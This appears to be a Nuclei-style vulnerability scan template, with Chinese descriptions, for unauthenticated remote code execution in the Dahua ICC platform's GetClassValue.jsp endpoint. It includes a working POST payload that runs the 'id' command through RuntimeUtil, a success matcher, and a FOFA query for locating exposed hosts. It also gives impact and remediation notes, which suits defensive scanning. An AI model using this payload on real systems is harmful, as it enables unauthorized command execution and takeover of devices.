id: dahua-icc-getclassvalue-rce

info:
  name: Dahua 'GetClassValue' - 远程代码执行漏洞
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    该模板用于检测 Dahua 'GetClassValue' - 远程代码执行漏洞。该类漏洞通常允许攻击者通过可控参数、接口调用或危险功能在目标服务端执行命令或代码。模板主要向 `/evo-apigw/admin/API/Developer/GetClassValue.jsp` 等路径发送探测请求，并根据响应中的 `uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可在目标服务权限下执行系统命令或应用代码，读取、修改业务数据并部署持久化后门。
    - 若服务运行在高权限账户或可访问内网资源，漏洞可能进一步导致主机失陷和横向移动。
  remediation: |
    - 升级受影响产品到厂商修复版本，或应用官方补丁/安全配置基线。
    - 限制相关管理接口、调试接口或危险功能的访问来源，避免直接暴露到公网。
    - 排查异常进程、计划任务、WebShell、新增账号和外联记录，并轮换可能泄露的密钥与凭据。
  reference:
    - https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/dahua-icc-getclassvalue-rce.yaml
  classification:
    cwe-id: CWE-78,CWE-94,CWE-470
  metadata:
    fofa-query: app="dahua-智能物联综合管理平台"
    max-request: 1
  tags: rce,java,dahua,iot,unauth,vuln

http:
  - raw:
      - |
        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
            "data": {
                "clazzName": "com.dahua.admin.util.RuntimeUtil",
                "methodName": "syncexecReturnInputStream",
                "fieldName": ["id"]
            }
        }

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"

      - type: status
        status:
          - 200
